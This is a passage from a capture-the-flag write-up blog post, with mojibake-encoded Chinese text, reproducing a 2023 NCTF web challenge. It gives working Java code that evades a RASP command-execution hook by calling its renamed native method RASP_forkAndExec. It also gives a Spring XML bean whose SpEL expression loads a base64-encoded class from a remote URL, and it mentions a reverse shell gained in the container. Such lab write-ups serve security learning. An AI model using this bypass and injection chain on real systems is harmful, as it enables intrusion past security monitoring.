&#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        System.out.println(baos.toString());<br>        System.out.println(<span class="hljs-string">&quot;finished&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œè°ƒç”¨äº†forkAndExecæ‰€ä»¥ä¼šè¢«æ£€æµ‹åˆ°ï¼Œå‚è€ƒè¿™ç¯‡<a target="_blank" rel="noopener" href="https://www.jrasp.com/guide/technology/native_method.html">hooknative</a>ï¼Œæˆ‘ä»¬è¯•è¯•å»è°ƒç”¨raspåˆ›å»ºçš„æ–°nativeæ–¹æ³•<code>RASP_forkAndExec</code>ï¼Œè¿™æ¬¡å°±å¯ä»¥äº†</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/poctest2.png" class="">

<p>é‚£ä¹ˆå¦‚ä½•æŠŠè¿™ä¹ˆé•¿çš„payloadåŠ è½½åˆ°spelå½“ä¸­å‘¢ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gk0d/p/16880749.html">å­—èŠ‚ç defineclass</a>å’Œ<a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">spelå†…å­˜é©¬</a>ï¼Œæˆ‘ä»¬å…ˆè·å–payloadçš„base64å­—èŠ‚ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> org.springframework.util.Base64Utils;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassEncode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.class&quot;</span>);<br>            data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];<br>            in.read(data);<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">shellStr</span> <span class="hljs-operator">=</span> Base64Utils.encodeToString(data);<br>        System.out.println(shellStr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶åå…ˆæœ¬åœ°load spring xmlæµ‹è¯•ï¼Œè¿™é‡Œè¦æŠŠä¸Šé¢çš„payloadçš„static void mainæ–¹æ³•æ¢æˆtestæ–¹æ³•ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XmlLodeClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPathXmlApplicationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;http://10.0.0.127:9090/test.xml&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>payload<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;com.test.test&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;your base64&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        String[] strs = &#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<br><br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;RASP_forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br><br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// è®¾ç½®è®¿é—®æƒé™</span><br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br><br>        <span class="hljs-comment">// è·å–æœ¬åœ°æ‰§è¡Œç»“æœçš„è¾“å…¥æµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        System.out.println(baos.toString());<br>        System.out.println(<span class="hljs-string">&quot;finished&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ€åç”¨rasp hookè¿è¡Œä¹Ÿæ˜¯å¯ä»¥çš„</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/payload.png" class="">

<p>æœ€ååœ¨å®¹å™¨å°è¯•åå¼¹shell</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/success.png" class="">

<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>[1] <a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/</a><br>[2] <a target="_blank" rel="noopener" href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#evilmq">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#evilmq</a></p>
</div>
          <nav class="post-nav">
    
    
    <a class="post-nav-item post-nav-next" href="/2023/12/09/new-begin/">
      <div class="nav-arrow">OLDER&nbsp;&gt;</div>
      <span class="post-title">New begin</span>
    </a>
    
  </nav>

   </main>
</div>


  <footer class="footer">
    <small class="footer_copyright">
      <div id="bottom-inner">
        Â© 2023 Site by daem0nu
      </div>
    </small>
  </footer>
  
  

    
      <script src="/js/main.js"></script>
    
  
  <script>
    window.FPConfig = {
      delay: 0,
      ignoreKeywords: [],
      maxRPS: 3,
      hoverDelay: 50,
    };
  </script>
  <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
</body>
</html>
